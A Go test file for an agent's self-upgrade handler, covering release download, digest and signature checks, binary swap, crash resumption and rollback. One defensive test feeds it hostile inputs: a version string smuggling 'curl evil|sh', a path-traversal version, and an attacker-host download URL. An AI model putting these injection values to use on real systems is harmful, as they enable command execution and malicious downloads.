package actions

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/shipkeepdev/shipkeep/agent/internal/journal"
	"github.com/shipkeepdev/shipkeep/agent/internal/upgrade"
	agentv1 "github.com/shipkeepdev/shipkeep/lib/gen/shipkeep/agent/v1"
)

const (
	upgradeTo  = "0.2.0"
	upgradeURL = "https://github.com/shipkeepdev/shipkeep/releases/download/v0.2.0/shipkeep-agent_0.2.0_linux_amd64.tar.gz"
	upgradeKey = "upgrade:0.2.0"
)

// releaseArchive is a release archive holding binary as shipkeep-agent.
func releaseArchive(t *testing.T, binary string) []byte {
	t.Helper()
	var out bytes.Buffer
	zipped := gzip.NewWriter(&out)
	writer := tar.NewWriter(zipped)
	if err := writer.WriteHeader(&tar.Header{Name: "shipkeep-agent", Typeflag: tar.TypeReg, Size: int64(len(binary)), Mode: 0o755}); err != nil {
		t.Fatal(err)
	}
	if _, err := writer.Write([]byte(binary)); err != nil {
		t.Fatal(err)
	}
	if err := errors.Join(writer.Close(), zipped.Close()); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

// github serves one archive, at most size bytes of it, and records what was asked.
type github struct {
	archive []byte
	asked   []string
}

func (g *github) RoundTrip(request *http.Request) (*http.Response, error) {
	g.asked = append(g.asked, request.URL.String())
	return &http.Response{StatusCode: http.StatusOK, Body: io.NopCloser(bytes.NewReader(g.archive)), ContentLength: int64(len(g.archive)), Request: request}, nil
}

// upgradeNode is a node with an installed agent, its unit and its state directory.
type upgradeNode struct {
	upgrader  Upgrader
	binary    string
	github    *github
	verified  []upgrade.Version
	restarted []string
}

// newUpgradeNode is a node running agent 0.1.0.
func newUpgradeNode(t *testing.T) *upgradeNode {
	const running = "0.1.0"
	t.Helper()
	root := t.TempDir()
	node := &upgradeNode{binary: filepath.Join(root, "bin", "shipkeep-agent"), github: &github{archive: releaseArchive(t, "agent 0.2.0")}}
	for _, dir := range []string{filepath.Dir(node.binary), filepath.Join(root, "state")} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(node.binary, []byte("agent "+running), 0o755); err != nil { //nolint:gosec // an executable stand-in
		t.Fatal(err)
	}
	unit := filepath.Join(root, "shipkeep-agent.service")
	if err := os.WriteFile(unit, []byte("[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config /etc/shipkeep/agent.yaml\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	node.upgrader = Upgrader{
		Version: running, Arch: "amd64", StateDir: filepath.Join(root, "state"), UnitFile: unit,
		Binary: func() (string, error) { return node.binary, nil },
		Client: &http.Client{Transport: node.github},
		Verify: func(_ []byte, _ [32]byte, version upgrade.Version) error {
			node.verified = append(node.verified, version)
			return nil
		},
		Restart: func(id string) { node.restarted = append(node.restarted, id) },
		Now:     func() time.Time { return time.Unix(1_800_000_000, 0).UTC() },
	}
	return node
}

func (n *upgradeNode) action() *agentv1.UpgradeAgent {
	digest := sha256.Sum256(n.github.archive)
	return &agentv1.UpgradeAgent{
		Version: upgradeTo, Url: upgradeURL, Sha256: hex.EncodeToString(digest[:]),
		CosignBundle: &agentv1.CosignBundle{BundleJson: []byte(`{"mediaType":"application/vnd.dev.sigstore.bundle.v0.3+json"}`)},
	}
}

func (n *upgradeNode) run(t *testing.T, store *journal.Store, action *agentv1.UpgradeAgent) *agentv1.ActionUpdate {
	t.Helper()
	d := &Dispatcher{Journal: store, Handlers: map[string]Handler{"upgrade_agent": UpgradeHandler(n.upgrader)}, Epoch: func() uint64 { return 3 }}
	req := &agentv1.ActionRequest{
		ActionId: testID, IdempotencyKey: upgradeKey, LeaseEpoch: 3, DeadlineUnixMs: time.Now().Add(time.Minute).UnixMilli(),
		Action: &agentv1.ActionRequest_UpgradeAgent{UpgradeAgent: action},
	}
	out := &recorder{}
	d.Handle(context.Background(), req, out.send)
	return out.last(t)
}

func (n *upgradeNode) file(t *testing.T, suffix string) string {
	t.Helper()
	data, err := os.ReadFile(n.binary + suffix)
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

func TestUpgradeAgentSwapsInTheVerifiedReleaseAndAsksForARestart(t *testing.T) {
	node := newUpgradeNode(t)
	before, err := os.Stat(node.binary)
	if err != nil {
		t.Fatal(err)
	}
	update := node.run(t, open(t), node.action())
	if !succeeded(update) {
		t.Fatalf("upgrade failed: %v", update)
	}
	if node.file(t, "") != "agent 0.2.0" || node.file(t, ".previous") != "agent 0.1.0" {
		t.Fatalf("binary %q, previous %q", node.file(t, ""), node.file(t, ".previous"))
	}
	previous, _ := os.Stat(node.binary + ".previous")
	if !os.SameFile(before, previous) {
		t.Fatal("previous is not a second name of the binary that ran")
	}
	if _, err := os.Stat(node.binary + ".next"); !os.IsNotExist(err) {
		t.Fatal(".next is left behind")
	}
	record, found, err := upgrade.ReadPending(node.upgrader.StateDir)
	if err != nil || !found || record.From != "0.1.0" || record.To != upgradeTo || record.State != upgrade.StatePending || record.Attempts != 0 || record.Binary != node.binary {
		t.Fatalf("record %+v %v", record, err)
	}
	if len(node.github.asked) != 1 || node.github.asked[0] != upgradeURL || len(node.verified) != 1 || node.verified[0].String() != upgradeTo {
		t.Fatalf("asked %v, verified %v", node.github.asked, node.verified)
	}
	if len(node.restarted) != 1 || node.restarted[0] != testID {
		t.Fatalf("restart requests %v", node.restarted)
	}
}

// After the restart, the new binary gets the redelivered request: the journal answers it, and a
// resumed swap step finds the new binary already running.
func TestTheNewBinaryAnswersTheRedeliveredUpgrade(t *testing.T) {
	node := newUpgradeNode(t)
	store := open(t)
	if !succeeded(node.run(t, store, node.action())) {
		t.Fatal("upgrade failed")
	}
	node.upgrader.Version = upgradeTo
	if update := node.run(t, store, node.action()); !succeeded(update) {
		t.Fatalf("redelivery answered %v", update)
	}
	if len(node.github.asked) != 1 {
		t.Fatal("the redelivery downloaded again")
	}
}

// A crash during each step: the journal runs that step again, and the ones after it, all of
// them retry-safe. A crash during the swap, once the rename happened, is resumed by the new binary.
func TestAnInterruptedUpgradeConvergesWhenResumed(t *testing.T) {
	for stop := range 3 {
		node := newUpgradeNode(t)
		plan, err := node.upgrader.plan(testID, node.action())
		if err != nil {
			t.Fatal(err)
		}
		for _, step := range plan.Steps[:stop+1] {
			if _, err := step.Apply(context.Background()); err != nil {
				t.Fatalf("step %s: %v", step.Name, err)
			}
		}
		resumer := node.upgrader
		if stop == 2 {
			resumer.Version = upgradeTo
		}
		resumed, err := resumer.plan(testID, node.action())
		if err != nil {
			t.Fatal(err)
		}
		for _, step := range resumed.Steps[stop:] {
			if _, err := step.Apply(context.Background()); err != nil {
				t.Fatalf("after a stop in %s, step %s: %v", plan.Steps[stop].Name, step.Name, err)
			}
		}
		if node.file(t, "") != "agent 0.2.0" || node.file(t, ".previous") != "agent 0.1.0" {
			t.Fatalf("stop in %s: binary %q, previous %q", plan.Steps[stop].Name, node.file(t, ""), node.file(t, ".previous"))
		}
	}
}

// Run again by the old binary after its own swap, the keep step refuses to keep the new binary as
// the previous one.
func TestTheKeepStepNeverKeepsTheNewBinary(t *testing.T) {
	node := newUpgradeNode(t)
	plan, err := node.upgrader.plan(testID, node.action())
	if err != nil {
		t.Fatal(err)
	}
	for _, step := range plan.Steps {
		if _, err := step.Apply(context.Background()); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := plan.Steps[0].Apply(context.Background()); err != nil {
		t.Fatal(err)
	}
	if _, err := plan.Steps[1].Apply(context.Background()); err == nil {
		t.Fatal("the new binary was kept as the previous one")
	}
	if node.file(t, ".previous") != "agent 0.1.0" {
		t.Fatalf("previous %q", node.file(t, ".previous"))
	}
}

func TestUpgradeAgentRefusesMaliciousRequests(t *testing.T) {
	node := newUpgradeNode(t)
	good := node.action()
	with := func(change func(*agentv1.UpgradeAgent)) *agentv1.UpgradeAgent {
		action := &agentv1.UpgradeAgent{Version: good.Version, Url: good.Url, Sha256: good.Sha256, CosignBundle: &agentv1.CosignBundle{BundleJson: good.CosignBundle.BundleJson}}
		change(action)
		return action
	}
	cases := map[string]*agentv1.UpgradeAgent{
		"no version":               with(func(a *agentv1.UpgradeAgent) { a.Version = "" }),
		"a version with a command": with(func(a *agentv1.UpgradeAgent) { a.Version = "0.2.0;curl evil|sh" }),
		"a version that climbs":    with(func(a *agentv1.UpgradeAgent) { a.Version = "0.2.0/../../x" }),
		"another host":             with(func(a *agentv1.UpgradeAgent) { a.Url = "https://evil.example.com/shipkeep-agent.tar.gz" }),
		"plain HTTP":               with(func(a *agentv1.UpgradeAgent) { a.Url = "http" + upgradeURL[5:] }),
		"the URL of another version": with(func(a *agentv1.UpgradeAgent) {
			a.Url = upgradeURL[:len(upgradeURL)-len("0.2.0_linux_amd64.tar.gz")] + "0.1.9_linux_amd64.tar.gz"
		}),
		"the URL of another arch": with(func(a *agentv1.UpgradeAgent) {
			a.Url = upgradeURL[:len(upgradeURL)-len("amd64.tar.gz")] + "arm64.tar.gz"
		}),
		"a URL with a query":           with(func(a *agentv1.UpgradeAgent) { a.Url = upgradeURL + "?x=1" }),
		"no digest":                    with(func(a *agentv1.UpgradeAgent) { a.Sha256 = "" }),
		"an uppercase digest":          with(func(a *agentv1.UpgradeAgent) { a.Sha256 = "AB" + good.Sha256[2:] }),
		"no bundle":                    with(func(a *agentv1.UpgradeAgent) { a.CosignBundle = nil }),
		"a bundle larger than allowed": with(func(a *agentv1.UpgradeAgent) { a.CosignBundle.BundleJson = make([]byte, 64<<10+1) }),
	}
	for name, action := range cases {
		if update := node.run(t, open(t), action); succeeded(update) || update.GetError() != errInvalid {
			t.Errorf("%s: %v", name, update)
		}
	}
	if len(node.github.asked) != 0 {
		t.Fatalf("a refused request downloaded: %v", node.github.asked)
	}
}

func TestUpgradeAgentRefusesWhatItCannotTrustOrDoSafely(t *testing.T) {
	cases := map[string]struct {
		setup func(*testing.T, *upgradeNode)
		want  string
	}{
		"a development build": {func(_ *testing.T, n *upgradeNode) { n.upgrader.Version = "dev" }, "a development build of the agent is not upgraded"},
		"the same version":    {func(_ *testing.T, n *upgradeNode) { n.upgrader.Version = upgradeTo }, "the agent already runs this version or a later one"},
		"an older version":    {func(_ *testing.T, n *upgradeNode) { n.upgrader.Version = "0.3.0" }, "the agent already runs this version or a later one"},
		"a unit with no guard": {func(t *testing.T, n *upgradeNode) {
			if err := os.WriteFile(n.upgrader.UnitFile, []byte("[Service]\nExecStart=/var/lib/shipkeep/bin/shipkeep-agent\n"), 0o600); err != nil {
				t.Fatal(err)
			}
		}, "the agent's service predates upgrades: run the installer again"},
		"no unit": {func(_ *testing.T, n *upgradeNode) { n.upgrader.UnitFile = filepath.Join(t.TempDir(), "absent") }, "the agent's service predates upgrades: run the installer again"},
		"a commented guard": {func(t *testing.T, n *upgradeNode) {
			unit := "[Service]\n#ExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config /etc/shipkeep/agent.yaml\n"
			if err := os.WriteFile(n.upgrader.UnitFile, []byte(unit), 0o600); err != nil {
				t.Fatal(err)
			}
		}, "the agent's service predates upgrades: run the installer again"},
		"another archive than the digest": {func(t *testing.T, n *upgradeNode) {
			n.github.archive = releaseArchive(t, "agent from elsewhere")
		}, "the release archive did not verify"},
		"a signature that does not hold": {func(_ *testing.T, n *upgradeNode) {
			n.upgrader.Verify = func([]byte, [32]byte, upgrade.Version) error { return upgrade.ErrRefused }
		}, "the release archive did not verify"},
		"an archive larger than the bound": {func(_ *testing.T, n *upgradeNode) {
			n.github.archive = make([]byte, upgrade.MaxArchiveBytes+1)
		}, "the release archive could not be downloaded"},
		"an archive with no agent": {func(t *testing.T, n *upgradeNode) {
			var out bytes.Buffer
			zipped := gzip.NewWriter(&out)
			_ = tar.NewWriter(zipped).Close()
			_ = zipped.Close()
			n.github.archive = out.Bytes()
		}, "the release archive did not verify"},
	}
	for name, c := range cases {
		node := newUpgradeNode(t)
		action := node.action()
		c.setup(t, node)
		if name == "another archive than the digest" {
			action.Sha256 = hex.EncodeToString(func() []byte { d := sha256.Sum256(releaseArchive(t, "agent 0.2.0")); return d[:] }())
		} else if name != "a development build" && name != "the same version" && name != "an older version" {
			digest := sha256.Sum256(node.github.archive)
			action.Sha256 = hex.EncodeToString(digest[:])
		}
		update := node.run(t, open(t), action)
		if succeeded(update) || update.GetError() != c.want {
			t.Errorf("%s: %v", name, update)
		}
		if node.file(t, "") != "agent 0.1.0" {
			t.Errorf("%s: the binary changed", name)
		}
		if _, err := os.Stat(node.binary + ".next"); !os.IsNotExist(err) {
			t.Errorf("%s: .next left behind", name)
		}
		if _, found, _ := upgrade.ReadPending(node.upgrader.StateDir); found {
			t.Errorf("%s: an upgrade is recorded", name)
		}
		if len(node.restarted) != 0 {
			t.Errorf("%s: a restart was asked", name)
		}
	}
}

func TestUpgradeAgentIsOnlyHandledWhenTheAgentWiresIt(t *testing.T) {
	without := Registry(nil, nil, nil, nil, Handler{})
	if _, ok := without["upgrade_agent"]; ok {
		t.Fatal("upgrade_agent handled without an upgrader")
	}
	with := Registry(nil, nil, nil, nil, Handler{}, WithUpgrader(newUpgradeNode(t).upgrader))
	if _, ok := with["upgrade_agent"]; !ok {
		t.Fatal("upgrade_agent not handled with an upgrader")
	}
}

func TestTheGuardMustBeAnActiveLineOfTheService(t *testing.T) {
	const guard = "ExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config /etc/shipkeep/agent.yaml"
	cases := map[string]bool{
		"[Service]\nType=notify\n" + guard + "\nExecStart=/var/lib/shipkeep/bin/shipkeep-agent\n": true,
		"[Unit]\nDescription=agent\n\n[Service]\n  " + guard + "  \n":                             true,
		"[Service]\nExecStartPre = /usr/local/libexec/shipkeep-egress upgrade-guard\n":            true,
		"[Service]\n#" + guard + "\n":  false,
		"[Service]\n; " + guard + "\n": false,
		"[Install]\n" + guard + "\n":   false,
		guard + "\n":                   false,
		"[Service]\nExecStartPre=-/usr/local/libexec/shipkeep-egress upgrade-guard\n": false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress\n":                false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress run\n":            false,
		"[Service]\nExecStartPre=/tmp/shipkeep-egress upgrade-guard\n":                false,
		"[Service]\nExecStart=/usr/local/libexec/shipkeep-egress upgrade-guard\n":     false,
		// An empty assignment empties the list of commands.
		"[Service]\n" + guard + "\nExecStartPre=\n": false,
		// A continued line is part of the line before it.
		"[Service]\nEnvironment=A=1 \\\n" + guard + "\n":     false,
		"[Service]\n" + guard + " \\\n--verbose\n":           false,
		"[Service]\nExecStartPre=/usr/bin/true \\\n" + guard: false,
		// Only arguments the guard parses: it does nothing with any other.
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config=/etc/shipkeep/agent.yaml\n": true,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard -config /etc/shipkeep/agent.yaml\n":  true,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --confg /etc/shipkeep/agent.yaml\n":  false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config\n":                          false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config=\n":                         false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config /etc/a.yaml extra\n":        false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard -h\n":                                false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config '/etc/a b.yaml'\n":          false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config \"/etc/a.yaml\"\n":          false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config %h/agent.yaml\n":            false,
		"[Service]\nExecStartPre=/usr/local/libexec/shipkeep-egress upgrade-guard --config $CONFIG\n":                  false,
	}
	for unit, want := range cases {
		if got := hasGuard(unit); got != want {
			t.Errorf("%q: %v", unit, got)
		}
	}
}

// A second upgrade while the first is not confirmed would keep the unconfirmed binary as the one
// to go back to: it is refused, before anything is downloaded, until the record is gone.
func TestASecondUpgradeWaitsForThePendingOne(t *testing.T) {
	node := newUpgradeNode(t)
	store := open(t)
	if !succeeded(node.run(t, store, node.action())) {
		t.Fatal("first upgrade failed")
	}
	third := releaseArchive(t, "agent 0.3.0")
	digest := sha256.Sum256(third)
	second := &agentv1.UpgradeAgent{
		Version: "0.3.0", Url: "https://github.com/shipkeepdev/shipkeep/releases/download/v0.3.0/shipkeep-agent_0.3.0_linux_amd64.tar.gz",
		Sha256: hex.EncodeToString(digest[:]), CosignBundle: node.action().CosignBundle,
	}
	node.github.archive = third
	run := func(id, key string) *agentv1.ActionUpdate {
		d := &Dispatcher{Journal: store, Handlers: map[string]Handler{"upgrade_agent": UpgradeHandler(node.upgrader)}, Epoch: func() uint64 { return 3 }}
		out := &recorder{}
		d.Handle(context.Background(), &agentv1.ActionRequest{
			ActionId: id, IdempotencyKey: key, LeaseEpoch: 3, DeadlineUnixMs: time.Now().Add(time.Minute).UnixMilli(),
			Action: &agentv1.ActionRequest_UpgradeAgent{UpgradeAgent: second},
		}, out.send)
		return out.last(t)
	}
	// Before the restart, then from the new binary before the control plane welcomed it.
	for index, running := range []string{"0.1.0", upgradeTo} {
		node.upgrader.Version = running
		id := "019d0000-0000-7000-8000-00000000001" + string(rune('b'+index))
		if update := run(id, "upgrade:0.3.0:"+running); succeeded(update) || update.GetError() != "another upgrade of the agent is not confirmed yet" {
			t.Fatalf("running %s: %v", running, update)
		}
		if node.file(t, "") != "agent 0.2.0" || node.file(t, ".previous") != "agent 0.1.0" {
			t.Fatalf("running %s: binary %q, previous %q", running, node.file(t, ""), node.file(t, ".previous"))
		}
		if _, err := os.Stat(node.binary + ".next"); !os.IsNotExist(err) {
			t.Fatalf("running %s: .next written", running)
		}
	}
	if len(node.github.asked) != 1 {
		t.Fatalf("a refused upgrade downloaded: %v", node.github.asked)
	}
	// Once the new binary confirmed the first upgrade, the second one keeps it as the previous.
	if err := upgrade.ClearPending(node.upgrader.StateDir); err != nil {
		t.Fatal(err)
	}
	if update := run("019d0000-0000-7000-8000-00000000001f", "upgrade:0.3.0"); !succeeded(update) {
		t.Fatalf("second upgrade after the confirmation: %v", update)
	}
	if node.file(t, "") != "agent 0.3.0" || node.file(t, ".previous") != "agent 0.2.0" {
		t.Fatalf("binary %q, previous %q", node.file(t, ""), node.file(t, ".previous"))
	}
}

// The swap step can fail after its rename, when the directory does not sync: undoing it puts the
// running binary back before the record goes. Without the rename, only the record goes.
func TestAFailedSwapIsUndoneBeforeItsRecordGoes(t *testing.T) {
	prepare := func(t *testing.T) (*upgradeNode, journal.Plan) {
		t.Helper()
		node := newUpgradeNode(t)
		plan, err := node.upgrader.plan(testID, node.action())
		if err != nil {
			t.Fatal(err)
		}
		for _, step := range plan.Steps[:2] {
			if _, err := step.Apply(context.Background()); err != nil {
				t.Fatalf("step %s: %v", step.Name, err)
			}
		}
		next, err := upgrade.FileSHA256(node.binary + ".next")
		if err != nil {
			t.Fatal(err)
		}
		if err := upgrade.WritePending(node.upgrader.StateDir, upgrade.Pending{From: "0.1.0", To: upgradeTo, Binary: node.binary, SHA256: next, At: time.Unix(1, 0).UTC(), State: upgrade.StatePending}); err != nil {
			t.Fatal(err)
		}
		return node, plan
	}
	swap := func(t *testing.T, node *upgradeNode) {
		t.Helper()
		if err := os.Rename(node.binary+".next", node.binary); err != nil {
			t.Fatal(err)
		}
	}

	node, plan := prepare(t)
	swap(t, node)
	if err := plan.Steps[2].Compensate(context.Background()); err != nil {
		t.Fatal(err)
	}
	if node.file(t, "") != "agent 0.1.0" || pendingFound(t, node) {
		t.Fatalf("after a swap: binary %q, record kept %v", node.file(t, ""), pendingFound(t, node))
	}

	node, plan = prepare(t)
	if err := plan.Steps[2].Compensate(context.Background()); err != nil {
		t.Fatal(err)
	}
	if node.file(t, "") != "agent 0.1.0" || node.file(t, ".previous") != "agent 0.1.0" || pendingFound(t, node) {
		t.Fatal("without a swap, the binaries changed or the record stayed")
	}

	// The new binary is in place, and nothing to go back to: the record stays for the guard.
	node, plan = prepare(t)
	swap(t, node)
	if err := os.Remove(node.binary + ".previous"); err != nil {
		t.Fatal(err)
	}
	if err := plan.Steps[2].Compensate(context.Background()); err == nil {
		t.Fatal("undone without a previous binary")
	}
	if node.file(t, "") != "agent 0.2.0" || !pendingFound(t, node) {
		t.Fatal("the record went while the new binary is in place")
	}
}

func pendingFound(t *testing.T, node *upgradeNode) bool {
	t.Helper()
	_, found, err := upgrade.ReadPending(node.upgrader.StateDir)
	if err != nil {
		t.Fatal(err)
	}
	return found
}
